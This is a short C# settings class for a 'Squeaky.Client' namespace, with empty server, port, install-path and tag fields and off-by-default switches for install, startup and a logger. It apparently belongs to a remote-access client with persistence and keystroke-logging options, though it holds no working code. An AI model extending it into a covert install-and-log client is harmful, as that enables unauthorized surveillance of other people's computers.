using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Squeaky.Client
{
    public static class Settings
    {
        public static string SUBDIRECTORY = "";
        public static string INSTALLNAME = "";
        public static string INSTALLPATH = "";
        public static string SERVER = "";
        public static string TAG = "";
        
        public static bool INSTALL = false;
        public static bool STARTUP = false;
        public static bool LOGGER = false;

        public static int SERVERPORT = 0;
    }
}
